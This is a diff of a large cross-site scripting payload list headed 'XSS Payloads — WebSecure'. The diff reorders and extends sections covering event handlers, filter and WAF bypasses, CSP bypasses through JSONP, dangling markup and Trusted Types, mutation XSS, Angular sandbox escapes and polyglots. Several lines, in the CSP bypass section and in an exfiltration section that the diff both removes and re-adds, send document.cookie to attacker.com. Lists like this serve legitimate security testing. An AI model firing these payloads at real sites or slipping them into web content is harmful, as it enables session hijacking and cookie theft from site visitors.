@@ -1,7 +1,7 @@
 # XSS Payloads — WebSecure
-# Reflected | DOM | Stored | Event-based | Protocol | CSP-bypass | Polyglot | Framework
+# Reflected | DOM | Stored | Event-based | Protocol | CSP-bypass | Polyglot | Framework | Trusted-Types | PostMessage
 
-# ── TEMEL SCRIPT ──
+# ── BASIC SCRIPT TAGS ──
 <script>alert(1)</script>
 <script>alert(document.domain)</script>
 <script>alert(document.cookie)</script>
@@ -15,41 +15,29 @@
 </script><script>alert(1)</script>
 <script>eval(atob('YWxlcnQoMSk='))</script>
 <script>setTimeout('alert(1)',0)</script>
-<script>setInterval('alert(1)',99999)</script>
 <script>window['alert'](1)</script>
-<script>window["alert"](1)</script>
 <script>top['alert'](1)</script>
 <script>self['alert'](1)</script>
-<script>this['alert'](1)</script>
 <script>(alert)(1)</script>
 <script>alert`1`</script>
-<script>alert(1//)</script>
 <script>alert(1/**/)</script>
 
 # ── EVENT HANDLERS ──
 <img src=x onerror=alert(1)>
 <img src=x onerror=alert(document.cookie)>
-<img src=x onerror='alert(1)'>
-<img src=x onerror="alert(1)">
 <img src=1 href=1 onerror="javascript:alert(1)">
-<img src onerror=alert(1)>
 <svg onload=alert(1)>
 <svg/onload=alert(1)>
-<svg onload='alert(1)'>
-<svg onload="alert(1)">
 <body onload=alert(1)>
 <body onpageshow=alert(1)>
-<body onfocus=alert(1)>
 <input onfocus=alert(1) autofocus>
 <input onblur=alert(1) autofocus><input autofocus>
 <input type=text value=1 onmouseover=alert(1)>
 <select autofocus onfocus=alert(1)>
 <textarea autofocus onfocus=alert(1)>
-<keygen autofocus onfocus=alert(1)>
 <video src=1 onerror=alert(1)>
 <audio src=1 onerror=alert(1)>
 <details ontoggle=alert(1) open>
-<details open ontoggle=alert(1)>
 <marquee onstart=alert(1)>
 <marquee loop=1 onfinish=alert(1)>
 <object data="javascript:alert(1)">
@@ -57,16 +45,13 @@
 <iframe onload=alert(1)>
 <iframe onload='alert(document.cookie)'>
 <a href="javascript:alert(1)">click</a>
-<a href=javascript:alert(1)>click</a>
 <a href=javascript:void(0) onclick=alert(1)>click</a>
 <button onclick=alert(1)>click</button>
 <form><button formaction=javascript:alert(1)>click</button></form>
 <div onclick=alert(1)>click</div>
 <div onmouseover=alert(1)>hover</div>
-<div onmousedown=alert(1)>click</div>
 <div onkeydown=alert(1) tabindex=1 autofocus>
 <table background="javascript:alert(1)">
-<td background="javascript:alert(1)">
 <math><mtext></table><img src=1 onerror=alert(1)>
 <isindex type=image src=1 onerror=alert(1)>
 <isindex action=javascript:alert(1) type=image>
@@ -76,15 +61,12 @@
 <svg><script xlink:href=data:,alert(1)/>
 <svg><use xlink:href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>
 <math><mi//xlink:href="data:x,<script>alert(1)</script>">
-<math><mtext><table><mglyph><svg><mtext><textarea><a title="</textarea><img src=1 onerror=alert(1)>">
 <picture><source srcset="1" type=image/png onerror=alert(1)>
 <video><source onerror=alert(1)>
 <audio><source onerror=alert(1)>
 <map name=x><area shape=default href=javascript:alert(1)></map><img usemap=#x>
 <object type=text/html data=javascript:alert(1)>
-<applet code=1 src=javascript:alert(1)>
 <base href=javascript:/a=alert(1)//>
-<link rel=import href=javascript:alert(1)>
 <meta http-equiv=refresh content="0;url=javascript:alert(1)">
 
 # ── PROTOCOL HANDLERS ──
@@ -93,7 +75,6 @@ javascript:alert(document.cookie)
 javascript:/**/alert(1)
 javascript://comment%0Aalert(1)
 javascript://%0aalert(1)
-javascript:alert(1)//
 vbscript:alert(1)
 vbscript:MsgBox(1)
 data:text/html,<script>alert(1)</script>
@@ -114,36 +95,56 @@ data:text/javascript,alert(1)
 ]]><script>alert(1)</script>
 </script><img src=x onerror=alert(1)>
 %3cscript%3ealert(1)%3c/script%3e
-%3Cscript%3Ealert(1)%3C/script%3E
 &lt;script&gt;alert(1)&lt;/script&gt;
 <img src="x`\"`onerror=alert(1)">
-<img src='x`\'`onerror=alert(1)'>
 "><img src=x onerror=alert(1)>
 '><img src=x onerror=alert(1)>
 "><svg onload=alert(1)>
-'><svg onload=alert(1)>
 "onmouseover=alert(1) "
-'onmouseover=alert(1) '
  onmouseover=alert(1)
 />onmouseover=alert(1)
 "><body onload=alert(1)>
 "><input autofocus onfocus=alert(1)>
 
-# ── CSP BYPASS ──
+# ── CSP BYPASS: COMMON TECHNIQUES ──
 <script nonce=INJECT>alert(1)</script>
 <meta http-equiv="Content-Security-Policy" content="">
-<script src=//cdn.jsdelivr.net/npm/something></script>
-<link rel=preconnect href=//attacker.com>
 <object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
 <script>fetch('//attacker.com/?c='+document.cookie)</script>
 <script>location='//attacker.com/?c='+document.cookie</script>
 <script>document.write('<img src=//attacker.com/?c='+encodeURIComponent(document.cookie)+'>')</script>
 <iframe srcdoc="<script>parent.alert(1)</script>">
-<iframe src="//attacker.com" onload="this.contentWindow.document.write('<script>parent.alert(1)<\/script>')">
 <base target="_blank"><a href=//attacker.com>click</a>
 <script src="//attacker.com/xss.js"></script>
 
-# ── FILTER BYPASS ──
+# ── CSP BYPASS: JSONP ENDPOINTS ──
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>
+<script src="https://www.google.com/jsapi?callback=alert"></script>
+<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click me</div></div>
+<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+
+# ── CSP BYPASS: DANGLING MARKUP ──
+"><img src='//attacker.com/?
+"><img src="//attacker.com/?
+"><table background="//attacker.com/?
+"><base href=//attacker.com/>
+
+# ── CSP BYPASS: IMPORT / PRELOAD ──
+<base href=//attacker.com>
+<link rel=prefetch href=//attacker.com/leak?c=>
+<link rel=preload href=//attacker.com as=script>
+<link rel=dns-prefetch href=//attacker.com>
+<script src=data:,alert(1)></script>
+<script>import('data:text/javascript,alert(1)')</script>
+<iframe srcdoc="<script src=//attacker.com/xss.js></script>">
+<meta http-equiv=Content-Security-Policy content="default-src *">
+
+# ── CSP BYPASS: TRUSTED TYPES (TT bypass) ──
+<script>trustedTypes.createPolicy('default',{createHTML:s=>s});document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<script>if(window.trustedTypes){trustedTypes.createPolicy('default',{createHTML:x=>x,createScriptURL:x=>x,createScript:x=>x})}</script>
+<script>const p=trustedTypes.createPolicy('x',{createHTML:s=>s});document.write(p.createHTML('<img src=x onerror=alert(1)>'))</script>
+
+# ── FILTER BYPASS: TAG / ATTRIBUTE TRICKS ──
 <scr<script>ipt>alert(1)</scr</script>ipt>
 <scr\x00ipt>alert(1)</scr\x00ipt>
 <script\x20>alert(1)</script>
@@ -151,22 +152,66 @@ data:text/javascript,alert(1)
 <script\x0d>alert(1)</script>
 <script\x0a>alert(1)</script>
 <<script>alert(1)//<</script>
-<script>alert(1)</script>
 <SCRIPT/XSS SRC="http://attacker.com/xss.js"></SCRIPT>
 <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>
 <svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
-<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
-<img src=x onerror=alert(1)>
 <img src=x onerror=String.fromCharCode(97,108,101,114,116,40,49,41)>
 <svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script>
 <img src=x onerror=eval(atob('YWxlcnQoMSk='))>
 <IMG SRC=j&#X41vascript:alert(1)>
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
-<IMG SRC="jav&#x0D;ascript:alert('XSS');">
 <IMG SRC=" &#14;  javascript:alert('XSS');">
 
-# ── DOM-BASED ──
+# ── FILTER BYPASS: KEYWORD SPLITTING ──
+<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
+<script/a>alert(1)</script>
+<script a="b">alert(1)</script>
+<script type="">alert(1)</script>
+<script type="text/javascript">alert(1)</script>
+<script type="application/javascript">alert(1)</script>
+<script type="application/ecmascript">alert(1)</script>
+<script type="text/livescript">alert(1)</script>
+<Script Language="Javascript">alert(1)</Script>
+
+# ── FILTER BYPASS: UNICODE NORMALIZATION ──
+＜script＞alert(1)＜/script＞
+＜img src=x onerror=alert(1)＞
+&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
+
+# ── FILTER BYPASS: NULL BYTES & WHITESPACE ──
+<scr\0ipt>alert(1)</scr\0ipt>
+<img src=x onerror\x00=alert(1)>
+<img src=x\x00onerror=alert(1)>
+<svg/onload\x0a=alert(1)>
+<svg/onload\x0d=alert(1)>
+<svg/onload\x09=alert(1)>
+<img src=x%0aonerror=alert(1)>
+<img src=x%0donerror=alert(1)>
+< script >alert(1)</ script >
+<
+script>alert(1)</script>
+<svg
+onload=alert(1)>
+<img
+src=x
+onerror=alert(1)>
+
+# ── FILTER BYPASS: WAF TAG VARIANTS ──
+<ScRiPt/XsS>alert(1)</sCrIpT>
+<SCRIPT/SRC=data:,alert(1)></SCRIPT>
+<IMG """><SCRIPT>alert(1)</SCRIPT>">
+<img src= onerror=alert(1)>
+<img/src=x/onerror=alert(1)>
+<img \x09src=x onerror=alert(1)>
+<img \x0csrc=x onerror=alert(1)>
+<img\x0dsrc=x onerror=alert(1)>
+<img\x0asrc=x onerror=alert(1)>
+<img \x00src=x onerror=alert(1)>
+<img src\x09=x onerror=alert(1)>
+<img src =x onerror=alert(1)>
+
+# ── DOM-BASED PAYLOADS ──
 #<script>alert(1)</script>
 #<img src=x onerror=alert(1)>
 #javascript:alert(1)
@@ -180,221 +225,6 @@ data:text/javascript,alert(1)
 ?cb=alert(1)//
 location.hash = '<img src=x onerror=alert(1)>';
 
-# ── POLYGLOT ──
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-'`"><\x3Cscript>javascript:alert(1)</script>
--->'"><img src=x onerror=alert(1)>
-</script><svg onload='alert(1)'>
-abc"><svg/onload=alert(1)><!--
-";alert(1);var foo="
-');alert(1);//
-\');alert(1);//
-
-# ── REACT / ANGULAR / VUE SPECIFIC ──
-{{constructor.constructor('alert(1)')()}}
-{{$on.constructor('alert(1)')()}}
-{{toString().constructor.prototype.charAt=[].join;[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}
-<div [innerHTML]="'<img src=x onerror=alert(1)>'">
-<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}>
-ng-app"><script>alert(1)</script>
-v-html="'<img src=x onerror=alert(1)>'"
-{{ 7*7 }}
-[[${7*7}]]
-#{7*7}
-```alert(1)```
-
-# ── EXFILTRATION ──
-<script>new Image().src='http://attacker.com/x?c='+document.cookie</script>
-<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>
-<script>navigator.sendBeacon('http://attacker.com/',document.cookie)</script>
-<img src=x onerror="this.src='http://attacker.com/?c='+document.cookie">
-<script>document.location='http://attacker.com/?c='+document.cookie</script>
-<script>window.location.href='http://attacker.com/?c='+encodeURIComponent(document.cookie)</script>
-<script>XMLHttpRequest.prototype.open=function(m,u){if(u.indexOf('attacker')==-1){fetch('http://attacker.com/?u='+u)}}</script>
-
-# ── mXSS (MUTATION XSS) ──
-<listing><img src=x onerror=alert(1)>
-<noscript><p title="</noscript><img src=x onerror=alert(1)>">
-<xmp><p title="</xmp><img src=x onerror=alert(1)>">
-<template><img src=x onerror=alert(1)></template>
-<math><mtext><table><mglyph><svg><mtext><textarea><a title="</textarea><img src=x onerror=alert(1)>">
-<svg><desc><![CDATA[</desc><script>alert(1)</script>]]>
-<select><option></select><img src=x onerror=alert(1)>
-<table><tr><td></table><img src=x onerror=alert(1)>
-<div id="</div><script>alert(1)</script>">
-<iframe src="//attacker.com/" onload="alert(parent.document.cookie)">
-
-# ── ATTRIBUTE INJECTION ──
-" onmouseover="alert(1)
-' onmouseover='alert(1)
-" autofocus onfocus="alert(1)
-' autofocus onfocus='alert(1)
-" onload="alert(1)
-" onclick="alert(1)
-"><img src=x onerror=alert(1) "
-'><img src=x onerror=alert(1) '
-" style="color:red" onmouseover="alert(1)
- style=xss:expression(alert(1))
- expression(alert(1))
-;background:url('javascript:alert(1)')
-
-# ── CSS INJECTION ──
-<style>@import 'javascript:alert(1)';</style>
-<style>body{background:url('javascript:alert(1)')}</style>
-<style>*{color:red}</style>
-<div style="background:url('java\nscript:alert(1)')">
-<div style="background:url('java script:alert(1)')">
-</style><script>alert(1)</script>
-<style>*{xss:expression(alert(1))}</style>
-
-# ── DATA URI / PROTOCOL ──
-<iframe src="data:text/html,<script>alert(parent.document.cookie)</script>">
-<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+">
-<a href="data:text/html,<script>alert(1)</script>">click me</a>
-<form action="data:text/html,<script>alert(1)</script>"><input type=submit>
-<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-<embed src="data:text/html,<script>alert(1)</script>">
-
-# ── SVG EXTENDED ──
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
-<svg><animate onbegin=alert(1) attributeName=x dur=1s>
-<svg><set attributeName=onmouseover value=alert(1)>
-<svg><animateTransform onbegin=alert(1) attributeName=transform>
-<svg><image xlink:href="x" onerror="alert(1)">
-<svg><a xlink:href="javascript:alert(1)"><rect width=100 height=100/></a>
-<svg><script type="text/javascript">alert(1)</script></svg>
-<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
-
-# ── UNICODE / CHARSET BYPASS ──
-<script>alert(1)</script>
-<script>alert(1)</script>
-<img src=x onerror=alert(1)>
-<img src=x onerror=alert(1)>
-<img src=x onerror=alert&#40;1&#41;>
-<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>
-<a href=javascript:alert&#40;1&#41;>click</a>
-<script>alert(1)</script>
-<svg/onload=alert(1)>
-
-# ── CONTEXT: JSON RESPONSE ──
-</script><script>alert(1)</script>
-\";<script>alert(1)</script>
-\");alert(1);//
-"}alert(1)//
-';alert(1);//
-`${alert(1)}`
-\x3cscript\x3ealert(1)\x3c/script\x3e
-
-# ── POLYGLOT EXTENDED ──
-<img/src/onerror=alert(1)>
-<img src=`x`onerror=alert(1)>
-<img src="x" onerror="alert(1)">
-<img src='x' onerror='alert(1)'>
-<ImG sRc=X oNeRrOr=alert(1)>
-<iMg src=x onerror=alert(1)//>
-<IMG SRC=x OnErRoR=alert(1)>
-<svg onload="ale"+"rt(1)">
-<svg onload="ale\x72t(1)">
-<svg onload="win"+"dow['ale'+'rt'](1)">
-<img src onerror="window['al\x65rt'](1)">
-
-# ── BROWSER SPECIFIC ──
-<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
-<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
-<link rel="stylesheet" href="javascript:alert(1)">
-<link rel="import" href="data:text/html,<script>alert(1)</script>">
-<script type="text/javascript" src="data:,alert(1)"></script>
-
-# ── WAF BYPASS: CASE + TAG TRICKS ──
-<ScRiPt/XsS>alert(1)</sCrIpT>
-<SCRIPT/SRC=data:,alert(1)></SCRIPT>
-<Script Language="Javascript">alert(1)</Script>
-<sCrIpT>alert(1)</sCrIpT>
-<script language=vbscript>msgbox 1</script>
-<script>window['\x61\x6c\x65\x72\x74'](1)</script>
-<script>window['alert'](1)</script>
-<IMG """><SCRIPT>alert(1)</SCRIPT>">
-<img src= onerror=alert(1)>
-<img/src=x/onerror=alert(1)>
-<img \x09src=x onerror=alert(1)>
-<img \x0csrc=x onerror=alert(1)>
-<img\x0dsrc=x onerror=alert(1)>
-<img\x0asrc=x onerror=alert(1)>
-<img\x0bsrc=x onerror=alert(1)>
-<img \x00src=x onerror=alert(1)>
-<img src\x09=x onerror=alert(1)>
-<img src\x0d=x onerror=alert(1)>
-<img src\x0a=x onerror=alert(1)>
-<img src =x onerror=alert(1)>
-<img src= x onerror=alert(1)>
-<img src=x onerror =alert(1)>
-<img src=x onerror= alert(1)>
-
-# ── WAF BYPASS: WHITESPACE ABUSE ──
-< script >alert(1)</ script >
-<	script	>alert(1)</	script	>
-<
-script>alert(1)</script>
-<script
->alert(1)</script>
-<svg
-onload=alert(1)>
-<img
-src=x
-onerror=alert(1)>
-
-# ── WAF BYPASS: ENCODING TRICKS ──
-%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
-&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
-&#60;script&#62;alert(1)&#60;/script&#62;
-<script>alert(1)</script>
-\x3cscript\x3ealert(1)\x3c/script\x3e
-<script>alert(String.fromCharCode(88,83,83))</script>
-<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
-<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
-<script>Function('alert(1)')()</script>
-<script>[].constructor.constructor('alert(1)')()</script>
-<script>({}[['constructor']]['constructor'])('alert(1)')()</script>
-
-# ── WAF BYPASS: NULL BYTES AND NEWLINES ──
-<scr\x00ipt>alert(1)</scr\x00ipt>
-<scr\0ipt>alert(1)</scr\0ipt>
-<img src=x onerror\x00=alert(1)>
-<img src=x\x00onerror=alert(1)>
-<svg/onload\x0a=alert(1)>
-<svg/onload\x0d=alert(1)>
-<svg/onload\x09=alert(1)>
-<img src=x%0aonerror=alert(1)>
-<img src=x%0donerror=alert(1)>
-
-# ── CONTEXT-SPECIFIC: HTML ATTRIBUTE ──
-" onpointerover="alert(1)
-" onpointerenter="alert(1)
-" onpointerdown="alert(1)
-" onpointerup="alert(1)
-" onpointermove="alert(1)
-" oncopy="alert(1)
-" onpaste="alert(1)
-" oncut="alert(1)
-" ondrag="alert(1)
-" ondragstart="alert(1)
-" ondragend="alert(1)
-" ondrop="alert(1)
-" onwheel="alert(1)
-" ontouchstart="alert(1)
-" ontouchmove="alert(1)
-" ontouchend="alert(1)
-" onauxclick="alert(1)
-" oncontextmenu="alert(1)
-" onanimationstart="alert(1)
-" onanimationend="alert(1)
-" ontransitionend="alert(1)
-" onselect="alert(1)
-" oninput="alert(1)
-" onchange="alert(1)
-" onsubmit="alert(1)
-
 # ── CONTEXT-SPECIFIC: JS CONTEXT ──
 '-alert(1)-'
 "-alert(1)-"
@@ -407,14 +237,39 @@ ${alert(1)}
 `${alert(1)}`
 \`;alert(1);//
 '+alert(1)+'
-"+alert(1)+"
 ;(alert)(1)//
 ;[1].find(alert)//
 ;setTimeout(alert,0)//
-;setInterval(alert,0)//
 ;window.onerror=alert;throw 1
 ;window.onerror=eval;throw'=alert\x281\x29'
 ;document.write('<img src=x onerror=alert(1)>')//
+
+# ── CONTEXT-SPECIFIC: HTML ATTRIBUTE ──
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" autofocus onfocus="alert(1)
+" onload="alert(1)
+" onclick="alert(1)
+"><img src=x onerror=alert(1) "
+" style="color:red" onmouseover="alert(1)
+ style=xss:expression(alert(1))
+;background:url('javascript:alert(1)')
+" onpointerover="alert(1)
+" onpointerenter="alert(1)
+" onpointerdown="alert(1)
+" oncopy="alert(1)
+" onpaste="alert(1)
+" ondrag="alert(1)
+" ondrop="alert(1)
+" onwheel="alert(1)
+" ontouchstart="alert(1)
+" onauxclick="alert(1)
+" oncontextmenu="alert(1)
+" onanimationstart="alert(1)
+" ontransitionend="alert(1)
+" oninput="alert(1)
+" onchange="alert(1)
+" onsubmit="alert(1)
 
 # ── CONTEXT-SPECIFIC: SVG ──
 <svg><script>alert&#40;1&#41;</script></svg>
@@ -422,135 +277,126 @@ ${alert(1)}
 <svg onload="javascript:alert(1)">
 <svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+I3gi"/>
 <svg><discard onbegin=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animateTransform onbegin=alert(1) attributeName=transform>
+<svg><image xlink:href="x" onerror="alert(1)">
+<svg><a xlink:href="javascript:alert(1)"><rect width=100 height=100/></a>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
 
-# ── CONTEXT-SPECIFIC: DOM-BASED SINKS ──
+# ── CONTEXT-SPECIFIC: DOM SINKS ──
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
 document.write('<img src=x onerror=alert(1)>')
 document.writeln('<script>alert(1)<\/script>')
-document.innerHTML='<img src=x onerror=alert(1)>'
 eval('alert(1)')
 setTimeout('alert(1)')
-setInterval('alert(1)',0)
 location='javascript:alert(1)'
 location.href='javascript:alert(1)'
 window.location='javascript:alert(1)'
 
-# ── CSP BYPASS: JSONP ──
-<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
-<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click me</div></div>
-<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>
-<script src="https://www.google.com/jsapi?callback=alert"></script>
-<script src="//api.instagram.com/oauth/authorize?callback=alert"></script>
-
-# ── CSP BYPASS: ANGULAR SANDBOX ESCAPE ──
-{{constructor.constructor('alert(1)')()}}
-{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
-{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
-{{[].pop.constructor('alert(1)')()}}
-{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)');}}
-<div ng-app=""><div ng-click='$event.view.window.alert(1)'>click</div></div>
-
-# ── CSP BYPASS: DANGLING MARKUP ──
-"><img src='//attacker.com/?
-"><img src="//attacker.com/?
-"><table background="//attacker.com/?
-"><base href=//attacker.com/>
-
-# ── MUTATION XSS (mXSS) ADVANCED ──
+# ── mXSS (MUTATION XSS) ──
+<listing><img src=x onerror=alert(1)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<xmp><p title="</xmp><img src=x onerror=alert(1)>">
+<template><img src=x onerror=alert(1)></template>
+<math><mtext><table><mglyph><svg><mtext><textarea><a title="</textarea><img src=x onerror=alert(1)>">
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]>
+<select><option></select><img src=x onerror=alert(1)>
+<table><tr><td></table><img src=x onerror=alert(1)>
+<div id="</div><script>alert(1)</script>">
 <p><b id="</b><img src=1 onerror=alert(1)>">
 <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=1 onerror=alert(1)>">
-<math><mtext><table><mglyph><svg><mtext><textarea><a title="</textarea><img src=1 onerror=alert(1)>">
-<noscript><p title="</noscript><img src=x onerror=alert(1)>">
-<listing><img src=x onerror=alert(1)>
-<div><div id='x'></div><script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>
 
-# ── EVENT HANDLER VARIANTS: POINTER/CLIPBOARD/MISC ──
-<div onpointerover=alert(1)>hover</div>
-<div onpointerenter=alert(1)>hover</div>
-<div onpointerdown=alert(1)>click</div>
-<div onpointermove=alert(1)>move</div>
-<div onpointerup=alert(1)>up</div>
-<div onpointercancel=alert(1)>cancel</div>
-<div onpointerout=alert(1)>out</div>
-<div onpointerleave=alert(1)>leave</div>
-<input oncopy=alert(1) value="copy me">
-<input onpaste=alert(1)>
-<input oncut=alert(1) value="cut me">
-<div onfocus=alert(1) tabindex=0>focus</div>
-<div onblur=alert(1) tabindex=0>blur</div>
-<div onauxclick=alert(1)>middle-click</div>
-<div oncontextmenu=alert(1)>right-click</div>
-<div onwheel=alert(1)>scroll wheel</div>
-<div ontouchstart=alert(1)>touch</div>
-<div onselect=alert(1)><input value="select me"></div>
-<video oncanplay=alert(1) src=data:video/mp4,>
-<audio oncanplay=alert(1) src=data:audio/mp3,>
-<body onhashchange=alert(1)><a href=#x>click</a>
-<body onresize=alert(1)>
-<body onscroll=alert(1)>
-<body onunload=alert(1)>
-<body onbeforeunload=alert(1)>
+# ── ATTRIBUTE INJECTION ──
+' autofocus onfocus='alert(1)
+ expression(alert(1))
 
-# ── POLYGLOT ADVANCED ──
+# ── CSS INJECTION ──
+<style>@import 'javascript:alert(1)';</style>
+<style>body{background:url('javascript:alert(1)')}</style>
+<div style="background:url('java\nscript:alert(1)')">
+<div style="background:url('java script:alert(1)')">
+<style>*{xss:expression(alert(1))}</style>
+
+# ── DATA URI / PROTOCOL ──
+<iframe src="data:text/html,<script>alert(parent.document.cookie)</script>">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+">
+<a href="data:text/html,<script>alert(1)</script>">click me</a>
+<form action="data:text/html,<script>alert(1)</script>"><input type=submit>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="data:text/html,<script>alert(1)</script>">
+
+# ── POLYGLOT ──
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'`"><\x3Cscript>javascript:alert(1)</script>
+-->'"><img src=x onerror=alert(1)>
+</script><svg onload='alert(1)'>
+abc"><svg/onload=alert(1)><!--
+";alert(1);var foo="
+');alert(1);//
 <!--><script>alert(1)</script>
 <!--<script>--> <script>alert(1)</script>
 <![CDATA[<script>alert(1)</script>]]>
-<![CDATA[><script>alert(1)</script>]]>
 </p></title></textarea></script>--><svg onload=alert(1)>
-</p></title></textarea><script>alert(1)</script>
 <a href="javascript&#58;alert(1)">x</a>
 <a href="java&#115;cript:alert(1)">x</a>
 <a href="java	script:alert(1)">x</a>
-<a href="java&#x9;script:alert(1)">x</a>
 <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>
 
-# ── FILTER BYPASS: KEYWORD SPLITTING ──
-<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
-<sc\r\nipt>alert(1)</sc\r\nipt>
-<script/a>alert(1)</script>
-<script a="b">alert(1)</script>
-<script type="">alert(1)</script>
-<script type="text/javascript">alert(1)</script>
-<script type="application/javascript">alert(1)</script>
-<script type="application/ecmascript">alert(1)</script>
-<script type="text/vbscript">msgbox 1</script>
-<script type="text/livescript">alert(1)</script>
+# ── ANGULAR SANDBOX ESCAPE ──
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{toString().constructor.prototype.charAt=[].join;[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+{{[].pop.constructor('alert(1)')()}}
+<div ng-app=""><div ng-click='$event.view.window.alert(1)'>click</div></div>
 
-# ── FILTER BYPASS: UNICODE NORMALIZATION ──
-＜script＞alert(1)＜/script＞
-＜img src=x onerror=alert(1)＞
-<script>alert(1)</script>
-<img src=x onerror=alert(1)>
-<sCrIpT>alert(1)</sCrIpT>
-<script>alert(1)</script>
-&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
+# ── REACT / VUE / FRAMEWORK ──
+<div [innerHTML]="'<img src=x onerror=alert(1)>'">
+<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}>
+ng-app"><script>alert(1)</script>
+v-html="'<img src=x onerror=alert(1)>'"
+{{ 7*7 }}
+[[${7*7}]]
+#{7*7}
 
-# ── SPECIAL ATTRIBUTE CONTEXTS ──
-<svg><a><rect width=100 height=100/><set attributeName=href to=javascript:alert(1)></a></svg>
-<math href=javascript:alert(1)>CLICKME</math>
-<table><td href=javascript:alert(1)>CLICK</td></table>
-<a href="javas&#99;ript:alert(1)">x</a>
-<a href="javas\x63ript:alert(1)">x</a>
-<a href="jAvAsCrIpT:alert(1)">x</a>
-<a href=javascript&colon;alert(1)>x</a>
-<object type=text/html data="javascript:alert(1)">
-<embed type="text/html" src="javascript:alert(1)">
-<form action=javascript:alert(1)><input type=submit>
-<button formaction=javascript:alert(1)>click</button>
-<input formaction=javascript:alert(1) type=submit value=click>
+# ── EXFILTRATION ──
+<script>new Image().src='http://attacker.com/x?c='+document.cookie</script>
+<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>
+<script>navigator.sendBeacon('http://attacker.com/',document.cookie)</script>
+<img src=x onerror="this.src='http://attacker.com/?c='+document.cookie">
+<script>document.location='http://attacker.com/?c='+document.cookie</script>
